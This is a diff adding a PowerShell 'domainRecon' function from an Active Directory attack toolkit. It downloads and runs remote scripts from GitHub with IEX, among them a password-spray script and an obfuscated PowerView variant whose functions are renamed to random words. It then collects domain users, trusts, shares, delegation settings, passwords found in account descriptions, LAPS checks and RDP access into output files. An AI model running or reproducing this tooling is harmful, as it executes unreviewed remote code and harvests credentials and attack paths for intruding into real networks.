@@ -1,0 +1,62 @@
+function domainRecon {
+[CmdletBinding()] param( 
+		[string]$reconfolder
+		)
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
+    $domain_Name = skulked
+    $Domain = $domain_Name.Name
+    Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii "$reconfolder\userlist.txt"
+	inset >> "$reconfolder\ExploitableSystems.txt"
+    try{
+            skulked >> "$reconfolder\NetDomain.txt"
+            televisions >> "$reconfolder\NetForest.txt"
+            misdirects >> "$reconfolder\NetForestDomain.txt"      
+            odometer >> "$reconfolder\NetDomainController.txt"  
+            Houyhnhnm >> "$reconfolder\NetUser.txt"    
+            Randal >> "$reconfolder\NetSystems.txt"
+	        Get-Printer >> "$reconfolder\localPrinter.txt"
+            damsels >> "$reconfolder\NetOU.txt"    
+            xylophone >> "$reconfolder\NetSite.txt"  
+            ignominies >> "$reconfolder\NetSubnet.txt"
+            reapportioned >> "$reconfolder\NetGroup.txt" 
+            confessedly >> "$reconfolder\NetGroupMember.txt"   
+            aqueduct >> "$reconfolder\NetFileServer.txt" 
+            marinated >> "$reconfolder\DFSshare.txt" 
+            liberation >> "$reconfolder\NetShare.txt" 
+            cherubs >> "$reconfolder\NetLoggedon"
+            Trojans >> "$reconfolder\Domaintrusts.txt"
+            sequined >> "$reconfolder\ForestTrust.txt"
+            ringer >> "$reconfolder\ForeignUser.txt"
+            condor >> "$reconfolder\ForeignGroup.txt"
+        }catch{Write-Host "Got an error"}
+
+	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+	breviaries -Printers >> "$reconfolder\DomainPrinters.txt"
+	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/SPN-Scan.ps1')
+	Discover-PSInterestingServices >> "$reconfolder\SPNScan_InterestingServices.txt"
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')            
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
+	thyme >> "$reconfolder\Passwords_in_description.txt"
+	Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPasswordPolicy.txt"
+	$Date = (Get-Date).AddYears(-1).ToFileTime()
+	prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$reconfolder\Users_Nochangedpassword.txt"
+    prostituted -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$reconfolder\Enabled_Users1.txt"
+    prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$reconfolder\Enabled_Users2.txt"
+    $Computers = breviaries -Unconstrained -Properties DnsHostName >> "$reconfolder\Unconstrained_Delegation_Systems.txt"
+    $Users = prostituted -AllowDelegation -AdminCount >> "$reconfolder\AllowDelegationUsers.txt"
+	$Users.samaccountname >> "$reconfolder\AllowDelegationUsers_samaccountnames_only.txt"     
+	$DomainPolicy = forsakes -Policy Domain
+    $DomainPolicy.KerberosPolicy >> "$reconfolder\Kerberospolicy.txt"
+    $DomainPolicy.SystemAccess >> "$reconfolder\Passwordpolicy.txt"
+	lapschecks
+	rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$reconfolder\RDPAccess_Systems.txt"
+}
+
+
+
+
+
+
+
